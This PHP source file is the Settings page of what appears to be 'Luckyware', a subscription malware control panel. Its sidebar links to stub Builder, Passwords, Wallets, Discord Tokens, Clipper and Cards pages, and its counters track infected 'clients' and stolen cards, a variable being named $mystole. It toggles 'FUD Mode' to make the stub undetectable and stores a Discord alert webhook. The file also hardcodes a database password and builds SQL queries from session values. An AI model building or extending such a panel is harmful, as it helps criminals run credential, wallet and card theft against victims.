<?php

session_start();
$domainyess = $_SERVER['HTTP_HOST'];
$secretkey = $_SESSION['secret_key'];
$username = $_SESSION['admin_name'];
$role = $_SESSION['Role'];
if (!isset($_SESSION['admin_name'])) {
    header('location:../Login/');
} else {

    if ($role == 'User') {
        header('location: https://' . $domainyess . '/Subscriptions');
    }

    $conn = mysqli_connect("localhost", "miner", "Sifre.12345", "luckyminer");

    if ($role == 'Founder') {

        $selectu = "SELECT * FROM miners";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE LastPing >= $fiveMinutesAgo";
    } else {
        $selectu = "SELECT * FROM miners WHERE OwnerID = '$secretkey'";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards WHERE OwnerID = '$secretkey'";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE OwnerID = '$secretkey' AND LastPing >= $fiveMinutesAgo";
    }

    $resultanss = mysqli_query($conn, $selectana);
    $myaktv = mysqli_num_rows($resultanss);
}

function startsWith($haystack, $needle)
{
    return strpos($haystack, $needle) === 0;
}

function sanitizeInput($input)
{
    // Define the list of forbidden characters
    $forbiddenChars = ['(', ')', '=', '*'];

    $isac = '0';
    // Check if the input contains any forbidden characters
    foreach ($forbiddenChars as $char) {
        if (strpos($input, $char) !== false) {
            // Forbidden character found, handle the error (you can customize this part)
            $isac = '1';
        }
    }

    if ($isac == '1') {

        return 'NoSpecialChar';
    } else {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }
}

function GetIP()
{

    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }


    return $_SERVER['REMOTE_ADDR'];
}


function getCountryCode($ip)
{

    $url = "http://ipinfo.io/{$ip}/json";
    $response = file_get_contents($url);
    $data = json_decode($response, true);

    return $data['country'] ?? 'Unknown';
}

$holdwbhk;
// Query to fetch the value from the "wallet" column
$webbby = "SELECT WebhookScr FROM accounts WHERE OwnerKey = '$secretkey'"; // You need to specify your table and condition here

$resultwebby = mysqli_query($conn, $webbby);

if ($resultwebby->num_rows > 0) {
    // Display the value from the "wallet" column
    $rowanan = $resultwebby->fetch_assoc();
    $WBRaw = $rowanan["WebhookScr"];

    if (empty($WBRaw)) {
        $holdwbhk = 'You will recieve ip addres and time of each login, Discord webhook only!';
    } else {
        $holdwbhk = 'Setted to ' . $WBRaw;
    }
}

$holdSCRTY;
// Query to fetch the value from the "wallet" column
$SecuirtyCtry = "SELECT SecuirtyCountry FROM accounts WHERE OwnerKey = '$secretkey'"; // You need to specify your table and condition here

$resultctryy = mysqli_query($conn, $SecuirtyCtry);

if ($resultctryy->num_rows > 0) {
    // Display the value from the "wallet" column
    $rowanancrty = $resultctryy->fetch_assoc();
    $CountryRw = $rowanancrty["SecuirtyCountry"];

    if ($CountryRw == "X") {
        $holdSCRTY = 'Account Country Lock Is Disabled.';
    } else {
        $holdSCRTY = 'Account Country Lock Is Enabled, Locked Country Code: ' . $CountryRw;
    }
}


$HoldFUD;
// Query to fetch the value from the "wallet" column
$FUDWRR = "SELECT FUDM FROM accounts WHERE OwnerKey = '$secretkey'"; // You need to specify your table and condition here

$ResultFUD = mysqli_query($conn, $FUDWRR);

if ($ResultFUD->num_rows > 0) {
    // Display the value from the "wallet" column
    $FUDRS = $ResultFUD->fetch_assoc();
    $IsFUDD = $FUDRS["FUDM"];

    if ($IsFUDD == "disabled") {
        $HoldFUD = 'FUD Mode for stub is Disabled.';
    } else {
        $HoldFUD = 'FUD Mode for stub is Enabled.';
    }
}




if (isset($_POST["wbhkscr"])) {

    $webhkk = sanitizeInput($_POST['webhook1']);

    if (startsWith($webhkk, "https://discord.com/api/webhooks/") || startsWith($webhkk, "https://discordapp.com/api/webhooks/")) {
        $sql = "UPDATE accounts SET WebhookScr=? WHERE OwnerKey=?";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("ss", $webhkk, $secretkey);

        if ($stmt->execute()) {
            header("Refresh:0");
        } else {
            header("Refresh:0");
        }
    } else {
        echo "<script type='text/javascript'>alert('Only Accepted Format: https://discord.com/api/webhooks/....');</script>";
    }
}

if (isset($_POST["disbbl"])) {

    $nono = "X";
    $sql = "UPDATE accounts SET SecuirtyCountry=? WHERE OwnerKey=?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $nono, $secretkey);

    if ($stmt->execute()) {
        $holdSCRTY = 'Account Country Lock Is Disabled.';
    } else {
    }
}

if (isset($_POST["enebel"])) {

    $IP = GetIP();

    $Kanty = getCountryCode($IP);

    if ($Kanty == "Unknown") {
        echo "<script type='text/javascript'>alert('Your country cannot be fetched, probaly because of your ip.');</script>";
    } else {
        $sql = "UPDATE accounts SET SecuirtyCountry=? WHERE OwnerKey=?";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("ss", $Kanty, $secretkey);

        if ($stmt->execute()) {
            $holdSCRTY = 'Account Country Lock Is Enabled, Locked Country Code: ' . $Kanty;
        } else {
        }
    }
}


if (isset($_POST["disbblfd"])) {

    $nono = "disabled";
    $sql = "UPDATE accounts SET FUDM=? WHERE OwnerKey=?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $nono, $secretkey);

    if ($stmt->execute()) {
        $HoldFUD = 'FUD Mode for stub is Disabled.';
    } else {
    }
}

if (isset($_POST["enebelfd"])) {

    $evett = "enabled";
    $sql = "UPDATE accounts SET FUDM=? WHERE OwnerKey=?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $evett, $secretkey);

    if ($stmt->execute()) {
        $HoldFUD = 'FUD Mode for stub is Enabled.';
    } else {
    }
}


?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../assets/css/custom.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/hover.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="../../assets/fontaw/css/all.min.css">
    <script src="https://dooovid.github.io/smoothcaret/demo/smoothCaret.min.js" defer></script>
    <meta content="Luckyware" property="og:title" />
    <meta content="Luck is something you make and victory is something u take" property="og:description" />
    <meta content="https://<?php echo $domainyess; ?>" property="og:url" />
    <meta content="https://<?php echo $domainyess; ?>/icon.png" property="og:image" />
    <meta content="#e2ff85" data-react-helmet="true" name="theme-color" />
    <link rel="shortcut icon" href="https://<?php echo $domainyess; ?>/icon.png" />
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.4.2/css/all.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.5/css/jquery.dataTables.css">
    <script type="text/javascript" charset="utf8"
        src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.js"></script>
    <title>Settings</title>

    <style>
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #111111;
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 1;
            visibility: visible;
            /* Add visibility property */
            transition: all 1s ease;
            /* Longer transition and apply to all */
        }

        .loading-overlay.fade-out {
            opacity: 0;
            visibility: hidden;
            /* Hide element after fade */
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-radius: 50%;
            border-top-color: #850000;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }

        /* Custom DataTable styles */
        #DashTable {
            border-radius: 0.5rem;
            background-color: var(--background);
            border-collapse: separate;
            border-spacing: 0 0.7rem;
            width: 100%;
        }

        #DashTable th {
            font-family: 'Kanit', sans-serif;
            font-weight: 500;
            color: #e7e5e4;
            font-weight: bold;
            text-align: center;
            padding: 10px;
            border-bottom: 1px solid var(--background);
        }

        #DashTable tr {
            background-color: var(--background);
            border-radius: 0.5rem;
        }

        #DashTable td {
            background-color: #151515;
            color: #a8a29e;
            text-align: center;
            border-bottom: 1px solid var(--background);
            padding: 10px;
            font-weight: 100;
            font-family: 'Kanit', sans-serif;
        }

        #DashTable td:first-child {
            border-radius: 0.5rem 0 0 0.5rem;
            /* Rounded corners on the left side */
        }

        #DashTable td:last-child {
            border-radius: 0 0.5rem 0.5rem 0;
            /* Rounded corners on the right side */
        }

        #DashTable tbody tr:hover {
            background-color: var(--main-hover-color);
            color: #D6D3D1;
        }

        /* Custom hover link color */
        .hover-link {
            color: #111111;
            transition: color 0.3s ease-in-out;
        }

        .hover-link:hover {
            color: #f54b42;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button {
            background-color: #151515;
            /* Add !important to ensure white color */
            border: none;
            padding: 7px 10px;
            margin: 2px;
            cursor: pointer;
            color: #a8a29e;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button:hover {
            background-color: #181818;
            border: none;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button.current {
            background-color: #850000;
            color: #e7e5e4;
            border: none;
        }

        /* Text color for elements like "Showing x to x of x entries" */
        .dataTables_info,
        .dataTables_length,
        .dataTables_paginate,
        .dataTables_filter {
            color: #a8a29e !important;
            margin-bottom: 7px;
            /* Add space below these elements */
        }

        /* Add space between "Show entries" and pagination controls */
        .dataTables_length,
        .dataTables_paginate {
            margin-top: 7px;
        }

        /* Color for the "Show x entries" dropdown and options */
        .dataTables_length select {
            background-color: #111111 !important;
            color: #d6d3d1 !important;
            border: 1px solid #181818 !important;
            /* Remove border to make it borderless */
            padding: 5px;
        }

        /* Color for the pagination controls */
        .dataTables_paginate a,
        .dataTables_paginate span,
        .dataTables_paginate .ellipsis {
            background-color: #111111;
            color: #d6d3d1 !important;
            /* Important to override DataTable's default styles */
            border: none;
            padding: 5px 10px;
            margin: 2px;
            cursor: pointer;
        }

        /* Hover color for pagination controls */
        .dataTables_paginate a:hover {
            background-color: #181818;
            border: none;
        }

        /* Current page number color */
        .dataTables_paginate .current {
            background-color: #850000;
            color: #d6d3d1 !important;
            /* Important to override DataTable's default styles */
            border: none;
        }

        /* DataTable search box styles */
        .dataTables_wrapper .dataTables_filter input {
            background-color: var(--background);
            color: #ffffff;
            border: 1px solid #181818;
            /* Add a 1px gray border */
            border-radius: 5px;
            padding: 5px;
        }

        /* DataTable ordering arrow styles */
        .dataTables_wrapper .dataTables_wrapper .sorting:after,
        .dataTables_wrapper .dataTables_wrapper .sorting:before,
        .dataTables_wrapper .dataTables_wrapper .sorting_asc:after,
        .dataTables_wrapper .dataTables_wrapper .sorting_asc:before,
        .dataTables_wrapper .dataTables_wrapper .sorting_desc:after,
        .dataTables_wrapper .dataTables_wrapper .sorting_desc:before {
            color: var(--main-color);
        }

        /* DataTable table responsive */
        .table-responsive {
            background-color: #111111;
            color: #D6D3D1;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }

        /* DataTable scrollbar styles (if needed) */
        #DashTable::-webkit-scrollbar {
            width: 8px;
        }

        #DashTable::-webkit-scrollbar-thumb {
            background-color: var(--main-color);
        }

        #DashTable::-webkit-scrollbar-track {
            background-color: var(--secondary-background);
        }


        .current {
            background-color: #850000;
        }
    </style>

    <script>
        document.documentElement.classList.add('js');
    </script>
</head>

<body class="dg">
    <div class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>
    <div class="grid xl:grid-cols-12"> <!-- start -->

        <div class="col-span-2 bg xl:grid sm:hidden pb-24 rounded-lg"> <!-- DESKTOP SIDENAV -->
            <div class="1">
               <div class="flex justify-center mt-10">
                    <h1 class="text-stone-300 fntBold text-2xl tracking-wide">
                        Lucky <span class="textCol">Ware</span>
                    </h1>
                </div>
                <div class="mx-5 mt-6">
                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Dashboard</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-house text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Builder';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Builder</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-hammer text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Passwords';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Password</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-key text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Wallets';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Wallets</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-wallet text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Tokens';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Tokens</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-brands fa-discord text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Automations';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Automations</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-play text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Clipper';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Clipper</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-clipboard text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Cards';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Cards</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-credit-card text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Settings';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn border-b brdCol mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Settings</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-gear textCol mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                    <button onclick="window.open('https://<?php echo $domainyess; ?>/Dashboard/Information', '_blank');"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Information</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-circle-info text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                </div>
            </div>
        </div>

        <div class="col-span-10 mx-5 mt-10"> <!-- CONTENT -->

            <div class="grid xl:grid-cols-4 sm:grid-cols-2 gap-5"> <!-- STATS -->

                <div class="1 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg w-96"><i
                                    class="fa-solid fa-earth-americas text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mytk; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="2 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-globe text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Active Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $myaktv; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="3 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-clipboard text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Cards</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mystole; ?>
                            </h1>
                        </div>
                    </div>
                </div>

               <a href="https://<?php echo $domainyess; ?>/Subscriptions" class="block">
                    <div class="4 bg rounded-lg px-5 py-5 btn cursor-pointer hover:opacity-90 transition">
                        <div class="grid grid-cols-3">
                            <div class="1 col-span-2">
                                <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                        class="fa-solid fa-money-bill text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                    Subscription</h1>
                            </div>
                            <div class="2 text-right">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                    <?php echo $role; ?>
                                </h1>
                            </div>
                        </div>
                    </div>
                </a>

            </div>

            <div class="grid xl:grid-cols-6 gap-5 mt-5">
                <!-- RAVEN ADDRESS -->
                <div class="xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 h-max btn2">
                    <div class="grid grid-cols-2">
                        <div>
                            <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400">
                                <i class="fa-solid fa-lock mr-1 icon2"></i> Account Security
                            </h1>
                        </div>
                        <div class="text-right"></div>
                    </div>

                    <hr class="mx-5 mt-2 border-stone-800">

                    <form method="post">
                        <div class="flex mx-5 mt-5 space-x-4">
                            <!-- First Textbox and Button -->
                            <div class="w-full">
                                <div class="textLabel">
                                    <label class="text-stone-300 fntBold tracking-wide" for="webhook1">Security
                                        Webhook</label>
                                    <div class="sc-container mt-2">
                                        <input id="webhook1" type="text" name="webhook1"
                                            class="smoothCaretInput rounded-lg py-2 px-3 text-stone-400 dg"
                                            placeholder="<?php echo $holdwbhk; ?>">
                                        <div class="caret bgCol" style="width: 2px; height: 60%;"></div>
                                    </div>
                                </div>

                                <div class="mt-3">
                                    <button id="wbhkscr" type="submit" name="wbhkscr"
                                        class="dg w-full py-2 rounded-lg text-stone-400 fntBold tracking-wide btn hvr-underline-from-center">
                                        <i class="fa-solid fa-save mr-1 icon"></i>
                                        Save Webhook
                                    </button>
                                </div>
                            </div>

                            <!-- Second Button Group (Enable and Disable) -->
                            <div class="w-full">
                                <div class="textLabel">
                                    <label class="text-stone-300 fntBold tracking-wide"
                                        for="enable"><?php echo $holdSCRTY; ?></label>
                                    <!-- Enable Button -->
                                    <div class="mt-2 mb-3">
                                        <button id="enebel" type="submit" name="enebel"
                                            class="dg w-full py-2 rounded-lg text-stone-400 fntBold tracking-wide btn hvr-underline-from-center">
                                            <i class="fa-solid fa-check mr-1 icon"></i>
                                            Enable
                                        </button>
                                    </div>

                                    <!-- Disable Button (Red) -->
                                    <button id="disbbl" type="submit" name="disbbl"
                                        class="dg w-full py-2 rounded-lg text-stone-400 fntBold tracking-wide btn hvr-underline-from-center">
                                        <i class="fa-solid fa-times mr-1 icon"></i>
                                        Disable
                                    </button>
                                </div>
                            </div>
                        </div>
                    </form>




                </div>
            </div>

            <div class="grid xl:grid-cols-6 gap-5 mt-5">
                <!-- RAVEN ADDRESS -->
                <div class="xl:col-start-1 xl:col-end-7 bg rounded-lg pb-5 h-max btn2">
                    <div class="grid grid-cols-2">
                        <div>
                            <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400">
                                <i class="fa-solid fa-file mr-1 icon2"></i> Stub Advanced Settings
                            </h1>
                        </div>
                        <div class="text-right"></div>
                    </div>

                    <hr class="mx-5 mt-2 border-stone-800">

                    <form method="post">
                        <div class="flex mx-5 mt-5 space-x-4">
                            <!-- Second Button Group (Enable and Disable) -->
                            <div class="w-full">
                                <div class="textLabel">
                                    <label class="text-stone-300 fntBold tracking-wide"
                                        for="enable"><?php echo $HoldFUD; ?></label>
                                    <!-- Enable Button -->
                                    <div class="mt-2 mb-3">
                                        <button id="enebelfd" type="submit" name="enebelfd"
                                            class="dg w-full py-2 rounded-lg text-stone-400 fntBold tracking-wide btn hvr-underline-from-center">
                                            <i class="fa-solid fa-check mr-1 icon"></i>
                                            Enable
                                        </button>
                                    </div>

                                    <!-- Disable Button (Red) -->
                                    <button id="disbblfd" type="submit" name="disbblfd"
                                        class="dg w-full py-2 rounded-lg text-stone-400 fntBold tracking-wide btn hvr-underline-from-center">
                                        <i class="fa-solid fa-times mr-1 icon"></i>
                                        Disable
                                    </button>
                                </div>
                            </div>
                        </div>
                    </form>




                </div>
            </div>

        </div>
    </div> <!-- end -->

    <script src="../assets/js/status.js"></script>
    <script src="../assets/js/builder.js"></script>

    <style>
        input::placeholder {
            color: #a8a29e;
        }
    </style>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Wait for fonts and stylesheets
            Promise.all([
                document.fonts.ready,
                new Promise(resolve => {
                    // Check if all stylesheets are loaded
                    const styleSheets = Array.from(document.styleSheets);
                    if (styleSheets.every(sheet => sheet.loaded !== false)) {
                        resolve();
                    } else {
                        window.addEventListener('load', resolve);
                    }
                })
            ]).then(() => {
                const overlay = document.querySelector('.loading-overlay');

                // Add the fade-out class
                overlay.classList.add('fade-out');

                // Remove the element after the transition completes
                overlay.addEventListener('transitionend', function() {
                    overlay.parentNode.removeChild(overlay);
                }, {
                    once: true
                });
            });
        });

        // Preload custom fonts if you're using any
        const fonts = ['Kanit'];
        fonts.forEach(font => {
            new FontFace(font, `url(path/to/${font}.woff2)`)
                .load()
                .then(loadedFont => document.fonts.add(loadedFont));
        });
    </script>

</body>

</html>